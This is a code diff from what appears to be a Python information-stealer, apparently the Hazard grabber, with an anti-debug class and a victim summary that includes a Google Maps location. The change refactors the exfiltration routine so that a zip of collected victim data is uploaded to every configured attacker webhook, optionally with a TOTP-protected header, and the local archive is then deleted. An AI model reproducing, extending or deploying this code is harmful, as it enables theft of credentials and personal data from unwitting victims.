@@ -784,7 +784,7 @@ GoogleMaps: {self.googlemap}
         ) as f:
             f.write(about)
 
-   def finish(self):
+    def finish(self):
         for i in os.listdir(self.dir):
             if i.endswith(".txt"):
                 path = self.dir + self.sep + i
@@ -890,37 +890,22 @@ GoogleMaps: {self.googlemap}
             embed.update({"content": "@everyone"})
 
         with open(_zipfile, "rb") as f:
-            if self.hook_reg in webhook1:
-                httpx.post(webhook1, json=embed)
-                httpx.post(webhook1, files={"upload_file": f})
-            else:
-                from pyotp import TOTP
+            for webhook in webhooks.values():
+                if self.hook_reg in webhook:
+                    httpx.post(webhook, json=embed)
+                    httpx.post(webhook, files={"upload_file": f})
+                else:
+                    from pyotp import TOTP
 
-                key = TOTP(self.fetch_conf("webhook_protector_key")).now()
-                httpx.post(webhook1, headers={"Authorization": key}, json=embed)
-                httpx.post(
-                    webhook1,
-                    headers={"Authorization": key},
-                    files={"upload_file": f},
-                )
-
-            # Dodanie drugiego webhooka
-            if self.hook_reg in webhook2:
-                httpx.post(webhook2, json=embed)
-                httpx.post(webhook2, files={"upload_file": f})
-            else:
-                from pyotp import TOTP
-
-                key = TOTP(self.fetch_conf("webhook_protector_key")).now()
-                httpx.post(webhook2, headers={"Authorization": key}, json=embed)
-                httpx.post(
-                    webhook2,
-                    headers={"Authorization": key},
-                    files={"upload_file": f},
-                )
+                    key = TOTP(self.fetch_conf("webhook_protector_key")).now()
+                    httpx.post(webhook, headers={"Authorization": key}, json=embed)
+                    httpx.post(
+                        webhook,
+                        headers={"Authorization": key},
+                        files={"upload_file": f},
+                    )
         os.remove(_zipfile)
         self.hazard_exit()
-
 
 
 class AntiDebug(Functions):
